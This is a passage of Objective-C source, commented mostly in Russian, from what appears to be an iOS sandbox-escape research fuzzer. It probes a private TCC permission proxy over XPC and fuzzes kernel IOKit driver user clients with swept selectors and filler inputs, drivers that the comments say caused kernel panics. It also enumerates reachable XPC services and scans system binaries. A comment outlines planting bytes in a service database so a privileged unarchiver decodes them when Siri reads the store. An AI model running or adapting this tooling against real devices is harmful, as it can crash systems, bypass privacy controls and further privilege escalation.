        // (BSNSXPCTransport.m:728) — соединение уже активировано через
        // -[BSServiceConnection activate]; идём сразу к proxy/вызову
        __block BOOL got = NO;
        __block BOOL status = NO;
        __block NSError *rerr = nil;
        LOG("[bq57] remoteObjectProxy: begin");
        id proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
            got = YES;
            rerr = err;
            LOG("[bq57] remoteObjectProxy ERROR: %s",
                err ? err.localizedDescription.UTF8String : "-");
        }];
        LOG("[bq57] proxy = %s",
            proxy ? [proxy description].UTF8String : "(nil)");
        SEL sel = NSSelectorFromString(
            @"photoServiceAuthorizationStatusForExtensionUUID:completion:");
        NSMethodSignature *sig = [proxy methodSignatureForSelector:sel];
        LOG("[bq57] сигнатура: %s argc=%lu",
            sig ? [sig description].UTF8String : "(nil)",
            (unsigned long)(sig ? sig.numberOfArguments : 0));
        if (!sig) { LOG("[bq57] сигнатуры нет — стоп"); [conn invalidate]; return; }
        NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
        [inv setSelector:sel];
        NSUUID *uuid = [NSUUID UUID];
        LOG("[bq57] probing UUID: %@", uuid.UUIDString);
        void (^completion)(BOOL, NSError *) = ^(BOOL st, NSError *error) {
            got = YES;
            status = st;
            rerr = error;
            LOG("[bq57] *** TCCProxy ОТВЕТ: photoServiceAuthorization"
                "Status=%d error=%s ***", (int)st,
                error ? error.localizedDescription.UTF8String : "-");
        };
        [inv setArgument:&uuid atIndex:2];
        [inv setArgument:&completion atIndex:3];
        [inv invokeWithTarget:proxy];
        LOG("[bq57] инвокация отправлена…");
        for (int t = 0; t < 50 && !got; t++) usleep(100000);
        LOG("[bq57] итог: got=%d status=%d err=%s",
            (int)got, (int)status,
            rerr ? rerr.localizedDescription.UTF8String : "-");
        [conn invalidate];
        LOG("[bq57] done");
        LOG("[bq57] VERDICT: 'photoServiceAuthorizationStatus=%d "
            "error=%s' = TCC-чтение из песочницы; тишина = собирать "
            "логи демона", (int)status,
            rerr ? rerr.localizedDescription.UTF8String : "-");
    } @catch (NSException *e) {
        LOG("[bq57] ИСКЛЮЧЕНИЕ: %s — %s", e.name.UTF8String ?: "?",
            e.reason ? e.reason.UTF8String : "?");
        LOG("[bq57] вернуться к интроспекции выше — какой шаг упал");
    }
    dispatch_semaphore_signal(bq57_sem);
    });
    // v206.4.1: НЕ ждём на main — BSNSXPCTransport/NSXPC внутри
    // синхронно дёргают main queue → semaphore_wait в главном потоке
    // = взаимный deadlock. Фаза возвращается сразу; фоновый блок
    // продолжает работать и писать в fuzz.log (runf вытянет через
    // RUNF_WAIT).
    LOG("[bq57] фоновый запуск... (фаза возвращается, лог продолжается)");
}


// p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
// УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
// отдаёт IOServiceGetMatchingService. Контекст: в VM-госте IOServiceOpen
// этого сервиса дал kernel data abort в кексте (§192), а кекст
// присутствует в retail-кэкше 24A5390f. Открыт ли он из песочницы —
// решает MACF-политика; здесь только existence-чек; open только по
// явному FUZZ_ASTRIS_OPEN (риск-тест, спрашивать оператора).
static void p_astris(void) {
    LOG("[astris] v192 retail-kernel Astris probe existence check (no open)");
    // v192j: собственные entitlement'ы процесса. Тест
    // com.apple.ane.iokit-user-access в ent.plist installs без ошибки,
    // но «MIS вырезал при установке» и «драйвер читает, но не гейтит»
    // неразличимы без прямого чтения. Контроль — application-groups
    // (известно работают: bad_query от них зависит); если оба nil —
    // детектор сломан (§144), вердикт не выносить.
    {
        LOG("[astris] ent-read begin");
        void *(*mk)(CFAllocatorRef) = (void *(*)(CFAllocatorRef))
            dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        CFTypeRef (*get)(void *, CFStringRef, CFErrorRef *) =
            (CFTypeRef (*)(void *, CFStringRef, CFErrorRef *))
            dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        LOG("[astris] ent-read dlsym mk=%p get=%p", mk, get);
        if (!mk || !get) {
            LOG("[astris] ent-read: SecTask API недоступен");
        } else {
            void *task = mk(kCFAllocatorDefault);
            static const char *ents[] = {
                "com.apple.security.application-groups",
                "com.apple.ane.iokit-user-access", NULL };
            for (int e = 0; ents[e]; e++) {
                CFStringRef kn = CFStringCreateWithCString(
                    NULL, ents[e], kCFStringEncodingUTF8);
                CFTypeRef v = task ? get(task, kn, NULL) : NULL;
                LOG("[astris] self-ent %s -> %s", ents[e],
                    v ? "PRESENT" : "ABSENT");
                if (v) CFRelease(v);
                CFRelease(kn);
            }
            if (task) CFRelease(task);
        }
    }
    static const char *names[] = {
        "AppleAstrisGpioProbe", "XAstrisGpioProbe",
        "AppleAstrisGpioProbeUserClient",
        // v192: второй паникер VM — IOServiceOpen(H1xANELoadBalancer)
        // -> AppleH16ANEInterface -> IOSurface data abort (§192)
        "H1xANELoadBalancer", "AppleH16ANEInterface", NULL
    };
    for (int i = 0; names[i]; i++) {
        LOG("[astris] loop i=%d name=%s begin", i, names[i]);
        @autoreleasepool {
        // NB: IOServiceGetMatchingService ПОТРЕБЛЯЕТ словарь (+1) —
        // отдавать ему ARC-NSDictionary через __bridge = over-release
        // и смерть процесса после первого же вызова (это и обрывало
        // фазу на строке matching #1). IOServiceMatching() отдаёт +1 ✓
        CFDictionaryRef m = IOServiceMatching(names[i]);
        LOG("[astris] dict ok, matching...");
        io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault, m);
        LOG("[astris] matching %s -> service 0x%x%s", names[i], s,
            s ? "" : " (nil)");
        if (s) {
            char cls[128] = {0};
            IOObjectGetClass(s, cls);
            LOG("[astris]   class=%s", cls);
            if (getenv("FUZZ_ASTRIS_OPEN")) {
                for (int t = 0; t < 8; t++) {   // v192i: 4..7 = type-свип
                                                 // (type=4 второй принятый)
                    mach_port_t conn = 0;
                    kern_return_t kr =
                        IOServiceOpen(s, mach_task_self(), t, &conn);
                    LOG("[astris]   open t=%d -> kr=0x%x conn=0x%x", t, kr, conn);
                    // v192d: живая поверхность — type=1 открывается из
                    // песочницы (§192). Свип селекторов с ЛОГОМ селектора
                    // ДО вызова: при панике ядра постмортем покажет точный
                    // sel/форму. Риск-тест — только по явному
                    // FUZZ_ASTRIS_FUZZ (согласуется с оператором).
                    if (kr == KERN_SUCCESS && conn &&
                        getenv("FUZZ_ASTRIS_FUZZ")) {
                        // (а) Many user-client'ов принимают externalMethod
                        // только после notification port (как AppleM2Scaler
                        // в этой же фаззе) — ставим и логим.
                        mach_port_t npt = MACH_PORT_NULL;
                        kern_return_t knp =
                            mach_port_allocate(mach_task_self(),
                                               MACH_PORT_RIGHT_RECEIVE, &npt);
                        if (knp == KERN_SUCCESS)
                            knp = IOConnectSetNotificationPort(conn, 0, npt, 0);
                        LOG("[astris]   SetNotificationPort -> kr=0x%x", knp);

                        static unsigned char inb[0x1000], outb[0x1000];
                        uint64_t sc[8] = {0};
                        for (int sel = 0; sel < 0x200; sel++) {
                            int sh = (sel + t) & 3;
                            size_t insz;
                            uint32_t nsc = 0;
                            switch (sh) {
                            case 0: insz = 0; break;
                            case 1: insz = 8; nsc = 4;
                                    memset(sc, 0xff, sizeof(sc));
                                    memset(inb, 0xff, sizeof(inb)); break;
                            case 2: insz = 0x100; sc[0] = 0x4141414141414141ULL;
                                    sc[1] = 0x100; break;
                            default: insz = 0x200;
                                     memset(inb, 0x42, sizeof(inb));
                                     sc[0] = insz; break;
                            }
                            uint32_t nso = 8;
                            size_t outs = sizeof(outb);
                            memset(outb, 0xaa, sizeof(outb));
                            // ЛОГ ДО вызова — постмортем-репро
                            LOG("[astris]   sel t=%d sel=0x%x sh=%d in=%zu",
                                t, sel, sh, insz);
                            kern_return_t kr2 = IOConnectCallMethod(
                                conn, (uint32_t)sel, sc, nsc, inb, insz,
                                NULL, &nso, outb, &outs);
                            // kr ДЛЯ КАЖДОГО селектора (v192e: первый свип
                            // дал 0 HIT без единого kr — неразличимо
                            // «все BadArgument» vs «все NotPrivileged»)
                            LOG("[astris]   res sel=0x%x kr=0x%x osz=%zu",
                                sel, kr2, outs);
                            int hit = (kr2 == KERN_SUCCESS) ||
                                      (kr2 != 0xe00002c2 && kr2 != 0xe00002c1 &&
                                       kr2 != 0xe00002e2 && kr2 != 0xe00002bc &&
                                       kr2 != 0xe00002c7);
                            if (hit)
                                LOG("[astris]   HIT sel=0x%x kr=0x%x osz=%zu",
                                    sel, kr2, outs);
                        }

                        // (б) Проба форматов (v192f): если гейт ждёт
                        // конкретный размер структуры/число скаляров, то
                        // 512 селекторов × 4 формы никогда его не достанут
                        // (все 512 = BadArgument). Перебор insz × nsc на
                        // узком наборе селекторов; логим только НЕ-BadArg.
                        static const size_t psz[] = {1,2,4,8,16,24,32,48,
                                                     64,128,256,512,1024,2048};
                        static const uint32_t pnsc[] = {0,1,2,4,8};
                        static const int psel[] = {0,1,2,3,4,8,0x10,0x20,
                                                   0x40,0x100};
                        int nprobe = 0, nbad = 0;
                        for (size_t si = 0; si < sizeof(psz)/sizeof(*psz); si++)
                        for (int ni = 0; ni < 5; ni++)
                        for (int pi = 0; pi < 10; pi++) {
                            size_t isz = psz[si];
                            uint32_t nc = pnsc[ni];
                            int s2 = psel[pi];
                            if (isz > sizeof(inb)) continue;
                            memset(sc, 0, sizeof(sc));
                            memset(inb, 0x43, sizeof(inb));
                            sc[0] = isz;
                            sc[1] = (uint64_t)s2;
                            uint32_t no = 8;
                            size_t oo = sizeof(outb);
                            nprobe++;
                            kern_return_t kr3 = IOConnectCallMethod(
                                conn, (uint32_t)s2, sc, nc, inb, isz,
                                NULL, &no, outb, &oo);
                            if (kr3 != 0xe00002c2) {
                                nbad++;
                                LOG("[astris]   PROBE sz=%zu nsc=%u sel=0x%x "
                                    "kr=0x%x osz=%zu",
                                    isz, nc, s2, kr3, oo);
                            }
                        }
                        LOG("[astris]   probe done: %d calls, %d non-BadArg",
                            nprobe, nbad);

                        // (в) Скалярная форма (v192g): пробы (б) всегда
                        // несли structureInput — если таблица диспетчера
                        // требует «скаляры БЕЗ структуры», ни одна форма
                        // её не давала (sh=0 был только nsc=0). Перебор
                        // nsc=1..8 × insz=0 × sel 0..0x7f.
                        int ns2 = 0, nbad2 = 0;
                        for (uint32_t nc = 1; nc <= 8; nc++)
                        for (int s2 = 0; s2 < 0x80; s2++) {
                            memset(sc, 0, sizeof(sc));
                            for (uint32_t k = 0; k < nc; k++)
                                sc[k] = 0xffffffffffffffffULL;
                            uint32_t no = 8;
                            size_t oo = sizeof(outb);
                            ns2++;
                            kern_return_t kr4 = IOConnectCallMethod(
                                conn, (uint32_t)s2, sc, nc, NULL, 0,
                                NULL, &no, outb, &oo);
                            if (kr4 != 0xe00002c2) {
                                nbad2++;
                                LOG("[astris]   SCALAR nsc=%u sel=0x%x "
                                    "kr=0x%x osz=%zu", nc, s2, kr4, oo);
                            }
                        }
                        LOG("[astris]   scalar done: %d calls, %d non-BadArg",
                            ns2, nbad2);

                        // (г) Type-свип (v192h): open принимал только
                        // type=1 (0/2/3 → NotReady) — но type это произвольный
                        // UInt32, за пределами 0..3 может быть отдельный
                        // клиент (в кексте два класса: H11ANEInUserClient и
                        // H11ANEInDirectPathClient — может, разные type).
                        if (t == 1) {
                            int nty = 0, nokt = 0;
                            for (uint32_t ty = 8; ty < 0x100; ty++) {
                                mach_port_t c2 = 0;
                                kern_return_t krt =
                                    IOServiceOpen(s, mach_task_self(), ty, &c2);
                                nty++;
                                if (krt == KERN_SUCCESS) {
                                    nokt++;
                                    LOG("[astris]   TYPE-HIT type=%u conn=0x%x",
                                        ty, c2);
                                    if (c2) IOServiceClose(c2);
                                } else if (krt != 0xe00002c7 &&
                                           krt != 0xe00002c2) {
                                    LOG("[astris]   type=%u kr=0x%x", ty, krt);
                                }
                            }
                            LOG("[astris]   typesweep: %d tried, %d opened",
                                nty, nokt);
                        }
                    }
                    if (kr == KERN_SUCCESS && conn) IOServiceClose(conn);
                }
            }
            IOObjectRelease(s);
        }
        } /* autoreleasepool */
    }
    // v192b: нулевой риск — что написано в sandbox-профилях про ANE
    // iokit-open: если правила НЕТ, open упрётся в MACF-дени (0xe00002e2,
    // кекст не входит, тест безопасен); если ЕСТЬ — open войдёт в кекст
    // и может повторить qemu-панику (§192) — это уже риск-тест.
    const char *pdir = "/System/Library/Sandbox/Profiles";
    DIR *pd = opendir(pdir);
    if (!pd) {
        LOG("[astris] profiles dir: %s", strerror(errno));
    } else {
        struct dirent *de;
        int nscan = 0;
        while ((de = readdir(pd))) {
            size_t nl = strlen(de->d_name);
            if (nl < 4 || strcmp(de->d_name + nl - 3, ".sb") != 0) continue;
            NSString *fp = [NSString stringWithFormat:@"%s/%s", pdir, de->d_name];
            NSData *d = [NSData dataWithContentsOfFile:fp];
            if (!d) continue;
            nscan++;
            NSString *ps = [[NSString alloc] initWithData:d
                                                 encoding:NSUTF8StringEncoding];
            if (!ps) continue;
            static NSArray<NSString *> *needles;
            needles = needles ?: @[@"H1xANE", @"H16ANE", @"ANEInterface",
                                   @"LoadBalancer"];
            for (NSString *nd in needles) {
                if ([ps rangeOfString:nd].location != NSNotFound) {
                    LOG("[astris] profile HIT %s contains '%s'",
                        de->d_name, nd.UTF8String);
                    break;
                }
            }
        }
        closedir(pd);
        LOG("[astris] scanned %d sandbox profiles", nscan);
    }
    // v192c: прямой вердикт MACF через sandbox_check — НОЛЬ РИСКА, сам open
    // не выполняется. Первая попытка (type=0) НЕВАЛИДНА: контролы
    // AppleM2ScalerCSCDriver и IOSurfaceRoot (оба ИЗВЕСТНО открываются)
    // дали 1=deny (§144-дыра — детектор без контроля не результат).
    // Калибруем матрицу type=0..3: детектор валиден там, где оба контрола
    // дают 0, и только там значение для H1xANELoadBalancer осмысленно.
    // NB: libsystem_sandbox — не отдельный файл на iOS (элемент кэша/libSystem),
    // символ экспортируется уже загруженной libSystem — RTLD_DEFAULT.
    int (*chk)(pid_t, const char *, int, const char *) =
        dlsym(RTLD_DEFAULT, "sandbox_check");
    if (!chk) {
        LOG("[astris] sandbox_check unavailable: %s", dlerror());
    } else {
        for (int ty = 0; ty <= 3; ty++) {
            int a = chk(getpid(), "iokit-open-user-client", ty,
                        "AppleM2ScalerCSCDriver");
            int b = chk(getpid(), "iokit-open-user-client", ty,
                        "H1xANELoadBalancer");
            int c = chk(getpid(), "iokit-open-user-client", ty,
                        "IOSurfaceRoot");
            LOG("[astris] check ty=%d scaler=%d h1x=%d surf=%d%s", ty,
                a, b, c,
                (a == 0 && c == 0) ? "  <- CONTROLS ALLOW, detector valid"
                                   : "");
        }
    }
    LOG("[astris] done");
}

// ---------------------------------------------------------------------------
// V177 (p_bq30): arm the cleanup and hand the window to a Siri query.
//
// What the strings now establish (svc.bin, bq20 dump):
//   - "Unexpected row format in feedEntries table" / "Found nil when
//     unarchiving LNValue" sit NEXT TO the row-select SQL and svc
//     carries _OBJC_CLASS_$_LNValue — the service unarchives
//     feedEntries.lnValue itself while iterating rows (read path),
//     so planted bytes reach its NSKeyedUnarchiver when a reader
//     fetches state;
//   - assistantd is a sanctioned client of
//     com.apple.intelligenceflow.context (its entitlements contain
//     the name) and the context runtime links LiveEntitySupport —
//     Siri queries are the real read trigger;
//   - cleanup ("...RE bootId=?") is keyed by bootId stored in
//     feedMetadata (string: "SELECT feedId, lastUpdate FROM
//     feedMetadata" nearby) — same-boot opens would never run it,
//     which is exactly why bq23/27/28 saw nothing.
//
// So this phase ARMS it: set feedMetadata's bootId (if the column
// exists) to a foreign value, plant oracle+control rows, and let the
// operator ask Siri questions. The next store touch by the service
// should see "stale boot", run the cleanup, delete the oracle row
// (live rows carry the real bootId and survive) and rewrite the
// metadata — all observable, all rolled back byte-exact afterwards.
//
// Controls (§144): escape handle; schema column checked before the
// UPDATE (never UPDATE a guessed column); verified byte-backup;
// INSERT/UPDATE failure => ROLLBACK; real bootId read from data;
// quiet-wait before restore; final byte-identical check; three
// notify posts (bq26/bq28 proved post rc=0) as an extra nudge for
// the reader.
// ---------------------------------------------------------------------------

// ---- p_xpcenum: v194 — какие XPC-имена достижимы из песочницы ----
//
// Контекст: xpc_connection_create_mach_service на iOS НЕ экспортируется
// (§v155, замерено: линковка падает) — mach-сервисы по имени из песочницы
// недостижимы в принципе. Достижимы XPC-СЕРВИСЫ: бандлы *.xpc,
// зарегистрированные в launchd. Кандидаты: on-disk скан /System/Library
// за *.xpc (читается целиком, §196) -> CFBundleIdentifier; вторичный
// источник — Label/MachServices из launchd-пллистов (если имя — mach
// сервис, получим invalid — logged, классификация постмортем по строке
// события).
//
// Контроли (§144): заведомо несуществующее имя обязано дать invalid-
// событие; позитив канала — ЛЮБОЙ reachable-сервис (не-error событие)
// доказывает, что перечислитель работает. Негатив без позитива и без
// интерпретируемого контроля = inconclusive.
//
// Фаза НЕ шлёт полезной нагрузки — только create/resume/ping(пустой
// словарь)/cancel: перечисление без риска для демонов.
// Скан печатных строк бинаря из песочницы (on-disk /System/Library читается
// целиком, §196). mode 1 — ключевые слова (protocol/XPC/entitle...),
// mode 2 — objc-селекторы (строки, оканчивающиеся на ':') + имена
// Manager/Protocol/Extension — карта методов XPC-интерфейса.
static void xpcen_scan_bin(NSString *path, int mode, int maxshow) {
    NSData *bin = [NSData dataWithContentsOfFile:path];
    LOG("[xpcen] scan %s bytes=%lu mode=%d", path.UTF8String,
        (unsigned long)bin.length, mode);
    if (!bin.length) return;
    const uint8_t *b = bin.bytes;
    NSUInteger n = bin.length, i = 0;
    int shown = 0;
    while (i < n && shown < maxshow) {
        if (b[i] < 0x20 || b[i] > 0x7e) { i++; continue; }
        NSUInteger j = i;
        while (j < n && b[j] >= 0x20 && b[j] <= 0x7e) j++;
        if (j - i >= 5) {
            char tok[200];
            NSUInteger L = MIN(j - i, (NSUInteger)199);
            memcpy(tok, b + i, L); tok[L] = 0;
            int hit = 0;
            if (mode == 1) {
                hit = strcasestr(tok, "protocol") ||
                      strcasestr(tok, "interface") ||
                      strcasestr(tok, "XPC") ||
                      strcasestr(tok, "EXK") ||
                      strcasestr(tok, "extensionkit") ||
                      strcasestr(tok, "entitle");
            } else {
                size_t tl = strlen(tok);
                hit = (tl >= 5 && tok[tl - 1] == ':' &&
                       strchr(tok, ':') == tok + tl - 1) ||
                      strcasestr(tok, "Manager") ||
                      strcasestr(tok, "Protocol") ||
                      strcasestr(tok, "Extension") ||
                      strcasestr(tok, "EXK");
            }
            if (hit) {
                LOG("[xpcen] s%d: %.190s", mode, tok);
                shown++;
            }
        }
        i = j;
    }
    LOG("[xpcen] scan %s shown=%d", path.UTF8String, shown);
}

static void p_xpcenum(void) {
    LOG("[xpcen] v194 XPC-service reachability from sandbox");
    // FUZZ_XPCENUM=2 — быстрый режим: без перечисления (уже сделано),
    // только сбор статики по известному reachable-сервису.
    // FUZZ_XPCENUM=3 — пробы адресации подсервисов BS-домена (v195).
    const char *xm = getenv("FUZZ_XPCENUM");
    int fast = xm[0] == '2' || xm[0] == '3';
    int npos = 0, nctl = 0, nerr = 0, nnone = 0;
    unsigned done = 0;
    NSMutableArray<NSString *> *cands = [NSMutableArray array];
    NSMutableSet<NSString *> *seen = [NSMutableSet set];
    NSArray<NSString *> *roots = @[ @"/System/Library/Frameworks",
                                    @"/System/Library/PrivateFrameworks",
                                    @"/System/Library/CoreServices" ];
    NSFileManager *fm = [NSFileManager defaultManager];
    dispatch_queue_t q = dispatch_queue_create("xpcen.q",
        DISPATCH_QUEUE_SERIAL);
    if (!fast) {
    for (NSString *root in roots) {
        NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
        NSString *rel;
        while ((rel = [en nextObject])) {
            if (![rel hasSuffix:@".xpc"]) continue;
            [en skipDescendants];
            NSString *ip = [[root stringByAppendingPathComponent:rel]
                stringByAppendingPathComponent:@"Info.plist"];
            NSDictionary *pl = [NSDictionary dictionaryWithContentsOfFile:ip];
            NSString *bid = pl[@"CFBundleIdentifier"];
            if ([bid isKindOfClass:[NSString class]] &&
                ![seen containsObject:bid]) {
                [seen addObject:bid];
                [cands addObject:bid];
            }
        }
    }
    LOG("[xpcen] candidates from .xpc bundles: %lu",
        (unsigned long)cands.count);
    // вторичный источник — launchd (Label + MachServices keys)
    NSArray *ldirs = @[ @"/System/Library/LaunchDaemons",
                        @"/System/Library/LaunchAgents" ];
    int nld = 0;
    for (NSString *d in ldirs) {
        NSDirectoryEnumerator *en = [fm enumeratorAtPath:d];
        NSString *f;
        while ((f = [en nextObject])) {
            if (![f.pathExtension isEqualToString:@"plist"]) continue;
            NSDictionary *pl = [NSDictionary dictionaryWithContentsOfFile:
                [d stringByAppendingPathComponent:f]];
            if (![pl isKindOfClass:[NSDictionary class]]) continue;
            NSString *lab = pl[@"Label"];
            NSDictionary *ms = pl[@"MachServices"];
            NSMutableArray *these = [NSMutableArray array];
            if ([lab isKindOfClass:[NSString class]])
                [these addObject:lab];
            if ([ms isKindOfClass:[NSDictionary class]])
                [these addObjectsFromArray:ms.allKeys];
            for (NSString *n in these)
                if (![seen containsObject:n]) {
                    [seen addObject:n];
                    [cands addObject:n];
                    nld++;
                }
        }
    }
    LOG("[xpcen] + launchd labels/machservices: %d", nld);

    // контроль DENY спереди; ALLOW-контроль — сам канал (любой позитив)
    NSMutableArray<NSString *> *final = [NSMutableArray arrayWithObjects:
        @"com.apple.zzz.invalid.control", nil];
    [final addObjectsFromArray:cands];

    for (NSString *ns in final) {
        char nmb[256];
        snprintf(nmb, sizeof(nmb), "%s", ns.UTF8String);
        NSString *nms = ns;   // блок захватывает объект, не C-массив
        __block BOOL got = NO;
        __block BOOL isErr = NO;
        xpc_connection_t c = xpc_connection_create(nmb, q);
        if (!c) { nnone++; done++; continue; }
        xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
            if (got) return;
            isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
            char *ds = xpc_copy_description(ev);
            LOG("[xpcen] ev %s%s: %.600s", nms.UTF8String,
                isErr ? " [ERR]" : " [POS]", ds ? ds : "?");
            free(ds);
            got = YES;
        });
        xpc_connection_resume(c);
        xpc_object_t ping = xpc_dictionary_create(NULL, NULL, 0);
        xpc_connection_send_message(c, ping);
        for (int t = 0; t < 3 && !got; t++) usleep(100000);
        if (!got) { nnone++; LOG("[xpcen] noevent %s", nmb); }
        else if (isErr) {
            nerr++;
            if (!strcmp(nmb, "com.apple.zzz.invalid.control")) nctl++;
        } else npos++;
        xpc_connection_cancel(c);
        done++;
        if ((done % 100) == 0)
            LOG("[xpcen] progress %u err=%d pos=%d none=%d",
                done, nerr, npos, nnone);
    }
        LOG("[xpcen] done: %u names, err=%d pos=%d none=%d ctl-deny-ok=%d",
            done, nerr, npos, nnone, nctl);
        LOG("[xpcen] VERDICT: %s",
            (npos > 0 || nctl == 1)
                ? "detector valid; pos>0 — reachable XPC services см. [POS]"
                : "inconclusive (ни позитива, ни контрольного invalid)");
    } else if (xm[0] == '2') {
        LOG("[xpcen] fast mode: перечисление пропущено, статика-сбор");
        npos = 1; nctl = 1;   // результат перечисления уже известен (v194)
        // v194d: BSServiceDomains объявляет 4 подсервиса (Discovery,
        // Launch, Observer, TCCProxy) — пробуем как отдельные endpoint'ы
        // (base + "." + имя) и логим ответ каждого.
        NSArray<NSString *> *probeNames = @[
            @"com.apple.extensionkitservice",
            @"com.apple.extensionkitservice.Discovery",
            @"com.apple.extensionkitservice.Launch",
            @"com.apple.extensionkitservice.Observer",
            @"com.apple.extensionkitservice.TCCProxy",
        ];
        for (NSString *pn in probeNames) {
            __block BOOL got = NO;
            __block BOOL isErr = YES;
            xpc_connection_t c = xpc_connection_create(pn.UTF8String, q);
            if (!c) { LOG("[xpcen] probe %s: create NULL", pn.UTF8String); continue; }
            NSString *pns = pn;
            xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
                if (got) return;
                isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
                char *ds = xpc_copy_description(ev);
                LOG("[xpcen] probe %s %s: %.600s", pns.UTF8String,
                    isErr ? "[ERR]" : "[POS]", ds ? ds : "?");
                free(ds);
                got = YES;
            });
            xpc_connection_resume(c);
            xpc_object_t ping = xpc_dictionary_create(NULL, NULL, 0);
            xpc_connection_send_message(c, ping);
            for (int t = 0; t < 10 && !got; t++) usleep(100000);
            if (!got) LOG("[xpcen] probe %s: no event in 1s", pns.UTF8String);
            xpc_connection_cancel(c);
        }
    } else if (xm[0] == '3') {
        // v195: адресация подсервисов BS-домена. RE ExtensionFoundation
        // (карв .01, xref "com.apple.extensionkitservice"): подсервис
        // передаётся ИМЕНЕМ рядом с созданием соединения (в коде видна
        // small-string "Discovery"); строки-соседи: "AppExtensionLaunch",
        // "SceneSessionService", "com.apple.extensionkit". Пробуем формы
        // имени как connection name + {"service": X} на base-соединении.
        NSArray<NSString *> *forms = @[
            @"com.apple.extensionkit.Discovery", @"com.apple.extensionkit.Launch",
            @"com.apple.extensionkit.Observer",  @"com.apple.extensionkit.TCCProxy",
            @"Discovery", @"Launch", @"Observer", @"TCCProxy",
            @"AppExtensionLaunch", @"SceneSessionService",
            @"com.apple.extensionkit._EXDiscoveryController",
            @"com.apple.extensionkit",
        ];
        for (NSString *pn in forms) {
            __block BOOL got = NO; __block BOOL isErr = YES;
            NSString *pns = pn;
            xpc_connection_t c = xpc_connection_create(pn.UTF8String, q);
            if (!c) { LOG("[xpcen] addr %s: create NULL", pn.UTF8String); continue; }
            xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
                if (got) return;
                isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
                char *ds = xpc_copy_description(ev);
                LOG("[xpcen] addr %s %s: %.500s", pns.UTF8String,
                    isErr ? "[ERR]" : "[POS]", ds ? ds : "?");
                free(ds); got = YES;
            });
            xpc_connection_resume(c);
            xpc_object_t ping = xpc_dictionary_create(NULL, NULL, 0);
            xpc_connection_send_message(c, ping);
            for (int t = 0; t < 8 && !got; t++) usleep(100000);
            if (!got) LOG("[xpcen] addr %s: no event in 0.8s", pns.UTF8String);
            xpc_connection_cancel(c);
        }
        // Batch B: bootstrap-ключи на base-соединении (подсервис TCCProxy)
        NSArray<NSString *> *keys = @[ @"service", @"serviceName", @"domain",
                                       @"_service", @"xpc.service" ];
        for (NSString *k in keys) {
            __block BOOL got = NO; __block BOOL isErr = YES;
            NSString *ks = k;
            xpc_connection_t c = xpc_connection_create(
                "com.apple.extensionkitservice", q);
            if (!c) continue;
            xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
                if (got) return;
                isErr = xpc_get_type(ev) == XPC_TYPE_ERROR;
                char *ds = xpc_copy_description(ev);
                LOG("[xpcen] msg {%s:TCCProxy} %s: %.500s", ks.UTF8String,
                    isErr ? "[ERR]" : "[POS]", ds ? ds : "?");
                free(ds); got = YES;
            });
            xpc_connection_resume(c);
            xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
            xpc_dictionary_set_string(m, k.UTF8String, "TCCProxy");
            xpc_connection_send_message(c, m);
            for (int t = 0; t < 8 && !got; t++) usleep(100000);
            if (!got) LOG("[xpcen] msg {%s:TCCProxy}: no event", ks.UTF8String);
            xpc_connection_cancel(c);
        }
    }
    // v194: локализовать reachable-сервис — путь .xpc-бандла, exe и
    // строки NSXPC-протоколов из бинаря (карта методов для фаззинга).
    if (npos > 0) {
        for (NSString *root in roots) {
            NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
            NSString *rel;
            while ((rel = [en nextObject])) {
                if (![rel hasSuffix:@".xpc"]) continue;
                [en skipDescendants];
                NSString *bp = [root stringByAppendingPathComponent:rel];
                NSDictionary *pl = [NSDictionary dictionaryWithContentsOfFile:
                    [bp stringByAppendingPathComponent:@"Info.plist"]];
                if (![pl[@"CFBundleIdentifier"]
                        isEqualToString:@"com.apple.extensionkitservice"])
                    continue;
                LOG("[xpcen] bundle: %s", bp.UTF8String);
                NSString *exe = pl[@"CFBundleExecutable"];
                LOG("[xpcen] exe: %s", exe.UTF8String);
                // v194c: Info.plist бандла целиком + embedded entitlements
                // из тела бинаря (видны <key>com.apple.private.xpc.*</key>)
                NSString *plDesc = [pl description];
                LOG("[xpcen] bundle-info: %.1200s", plDesc.UTF8String);
                NSString *ep0 = [bp stringByAppendingPathComponent:
                    exe ?: @"extensionkitservice"];
                NSData *bd = [NSData dataWithContentsOfFile:ep0];
                if (bd.length) {
                    const char *hb = (const char *)bd.bytes;
                    const char *xs = memmem(hb, bd.length, "<?xml", 5);
                    if (xs) {
                        const char *xe = memmem(xs, bd.length - (xs - hb),
                            "</plist>", 8);
                        if (xe) {
                            NSData *ent = [NSData dataWithBytes:xs
                                length:(size_t)(xe + 8 - xs)];
                            NSString *ents = [[NSString alloc]
                                initWithData:ent encoding:4];
                            LOG("[xpcen] embedded-ents: %.1500s",
                                ents.UTF8String);
                        }
                    } else LOG("[xpcen] embedded-ents: not found");
                }
                NSString *ep = ep0;
                xpcen_scan_bin(ep, 1, 60);   // режим 1: ключевые слова
            }
        }
        // v194b: клиентские фреймворки — objc-селекторы (методы интерфейса)
        xpcen_scan_bin(@"/System/Library/Frameworks/"
            @"ExtensionFoundation.framework/ExtensionFoundation", 2, 250);
        xpcen_scan_bin(@"/System/Library/PrivateFrameworks/"
            @"ExtensionKit.framework/ExtensionKit", 2, 250);
        xpcen_scan_bin(@"/System/Library/PrivateFrameworks/"
            @"ExtensionKitUIService.framework/ExtensionKitUIService", 2, 100);
    }
    LOG("[xpcen] done-marker");
}

static void p_bq30(void) {
    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
    const uint64_t F_DEF = 0x0000008000000000ULL;
    int secs = getenv("FUZZ_BQ30_SECS") ? atoi(getenv("FUZZ_BQ30_SECS")) : 180;
    if (secs < 10) secs = 10;
